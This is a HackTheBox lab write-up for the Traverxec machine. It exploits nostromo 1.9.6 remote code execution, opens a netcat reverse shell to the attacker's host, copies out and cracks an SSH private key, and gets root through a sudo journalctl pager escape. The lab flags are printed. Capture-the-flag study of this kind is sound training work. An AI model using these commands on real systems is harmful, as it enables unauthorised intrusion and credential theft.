---
layout: post
title: Hackthebox Traverxec Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-04-12/traverxec.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Traverxec`.

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.165 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 20:03 EEST
Nmap scan report for 10.10.10.165
Host is up (0.036s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.09 seconds
```

### Gobuster HTTP:
```shell
root@kali:~# gobuster dir -u http://10.10.10.165 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.165
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/11 20:07:06 Starting gobuster
===============================================================
[ERROR] 2020/04/11 20:07:07 [!] Get http://10.10.10.165/.well-known/csvm: dial tcp 10.10.10.165:80: connect: connection refused
[ERROR] 2020/04/11 20:07:07 [!] Get http://10.10.10.165/.well-known/dnt: dial tcp 10.10.10.165:80: connect: connection refused
[ERROR] 2020/04/11 20:07:07 [!] Get http://10.10.10.165/.well-known/carddav: dial tcp 10.10.10.165:80: connect: connection refused

---

```


## 2. Getting User
Using searchsploit, we can find a RCE for `nostromo 1.9.6`.
```shell
root@kali:~# searchsploit nostromo
---------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)              | exploits/multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                            | exploits/multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution              | exploits/linux/remote/35466.sh
---------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Go to the Exploit-db page for <a href="https://www.exploit-db.com/exploits/47837">nostromo 1.9.6 - Remote Code Execution</a>.<br>
We can download the POC code and the usage is quite simple.
```shell
root@kali:~# python 47837.py 10.10.10.165 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    




HTTP/1.1 200 OK
Date: Sat, 11 Apr 2020 17:18:35 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This server has `nc` that has a dangerous option `-e`.<br>
We can use it for the getting reverse shell.
```shell:exploit
root@kali:~# python 47837.py 10.10.10.165 80 'nc 10.10.14.32 443 -e /bin/bash'


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    
```
```shell:reverse_shell
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.165] 33616
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Look at `/var/nostromo/conf/nhttpd.conf`.<br>
We can find the following 2:
1. We have `.htpasswd` in `/var/nostromo/conf`. 
2. We have an interesting parameter `homedirs_public:publc_www`

```shell:nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

After that, look at `/var/mpstromo/conf/.passwd`.<br>
We can find a hash for an user `david`.
```shell:nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd   
cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Besides, we can find a directory `protected-file-area` in `/home/david`.
```shell
www-data@traverxec:/home/david/public_www$ ls -la
ls -la
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
```

Then, go to `protected-file-area`.<br>
We have an archive `backup-ssh-identity-files.tgz`.
```shell
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
ls
backup-ssh-identity-files.tgz
```

Using base64 encoding way, we can transfer the archive to the localhost.<br>
First, base64 encode the archive file.
```shell
www-data@traverxec:/home/david/public_www/protected-file-area$ base64 backup-ssh-identity-files.tgz
<ted-file-area$ base64 backup-ssh-identity-files.tgz           
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
```

Then, copy and paste the encoded text. Create a file `ssh-identity` on the localhost.
```shell
root@kali:~# cat ssh-identify 
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
```

Decode the archive and extract files.
```shell
root@kali:~# cat ssh-identify | base64 -d > ssh-identify.tgz

root@kali:~# tar -xvf ssh-identify.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

However, we need to identify the passphrase for the `id_rsa` for SSH login.
```shell
root@kali:~# ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 

```

We can achieve this purpose using `ssh2john`.<br>
The passphrase for the `id_rsa` is `hunter`.
```shell
root@kali:~# cp home/david/.ssh/id_rsa .

root@kali:~# python /usr/share/john/ssh2john.py id_rsa > hash.txt

root@kali:~# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:04 DONE (2020-04-11 21:05) 0.2277g/s 3266Kp/s 3266Kc/s 3266KC/sa6_123..*7¡Vamos!
Session completed
```

Now we have enough information to log in to `Traverxec`.<br>
We can get a shell as user `david`.
```shell
root@kali:~# ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

`user.txt` is in the home directory of `david`.
```shell
david@traverxec:~$ cat user.txt 
7db0b48469606a42cec20750d9782f3d
```


## 3. Getting Root
We have another directory `~/bin` in the home directory of `david`.
```shell
david@traverxec:~$ ls
bin  public_www  user.txt

david@traverxec:~$ cd bin

david@traverxec:~/bin$ ls -la
total 16
drwx------ 2 david david 4096 Oct 25 16:26 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-r-------- 1 david david  802 Oct 25 16:26 server-stats.head
-rwx------ 1 david david  363 Oct 25 16:26 server-stats.sh
```

In `server-stats.sh`, we have an interesting line that tries to run a command with root permission.
```shell
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

Since we don't have any password for user `david`, we can't run `sudo -l`.
```shell
david@traverxec:~/bin$ sudo -l
[sudo] password for david:

```

However, we can confirm that we can run the command as root user by running the command.
```shell
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-- Logs begin at Sat 2020-04-11 13:06:12 EDT, end at Sat 2020-04-11 14:19:20 EDT. --
Apr 11 13:06:15 traverxec systemd[1]: Starting nostromo nhttpd server...
Apr 11 13:06:15 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start: No such file or directory
Apr 11 13:06:16 traverxec nhttpd[458]: started
Apr 11 13:06:16 traverxec nhttpd[458]: max. file descriptors = 1040 (cur) / 1040 (max)
Apr 11 13:06:16 traverxec systemd[1]: Started nostromo nhttpd server.
```

We can google the following keyword and find a webpage <a href="https://gtfobins.github.io/gtfobins/journalctl/">https://gtfobins.github.io/gtfobins/journalctl/</a>.<br>
This is called `GTFOBin` and we have a list of them <a href="https://gtfobins.github.io/">here</a>.
```shell
journalctl privilege escalation
```

If we don't use pipe, we can see that the command invokes a program similar to `less`.
```shell
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sat 2020-04-11 13:06:12 EDT, end at Sat 2020-04-11 14:26:26 EDT. --
Apr 11 13:06:15 traverxec systemd[1]: Starting nostromo nhttpd server...
Apr 11 13:06:15 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttp
Apr 11 13:06:16 traverxec nhttpd[458]: started
Apr 11 13:06:16 traverxec nhttpd[458]: max. file descriptors = 1040 (cur) / 1040 (max)
Apr 11 13:06:16 traverxec systemd[1]: Started nostromo nhttpd server.
lines 1-6/6 (END)
```

This means by prefixing `!`, we can execute any command.<br>
Even we can execute `/bin/bash` with root privilege.
```shell
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sat 2020-04-11 13:06:12 EDT, end at Sat 2020-04-11 14:21:58 EDT. --
Apr 11 13:06:15 traverxec systemd[1]: Starting nostromo nhttpd server...
Apr 11 13:06:15 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttp
Apr 11 13:06:16 traverxec nhttpd[458]: started
Apr 11 13:06:16 traverxec nhttpd[458]: max. file descriptors = 1040 (cur) / 1040 (max)
Apr 11 13:06:16 traverxec systemd[1]: Started nostromo nhttpd server.
!/bin/bash
root@traverxec:/home/david/bin#
```

As always, `root.txt` is in the directory `/root`.
```shell
root@traverxec:~# cat root.txt
9aa36a6d76f785dfd320a478f6e0d906
```


## 4. Beyond the root
```shell:/etc/systemd/system/nostromo.service
root@traverxec:/home/david# cat /etc/systemd/system/nostromo.service
[Unit]
Description=nostromo nhttpd server
After=network.target

[Service]
Type=forking
ExecStart=/usr/local/sbin/nhttpd
PIDFile=/var/nostromo/logs/nhttpd.pid
TimeoutSec=30
RestartSec=15s
Restart=always
 
[Install]
WantedBy=multi-user.target
```
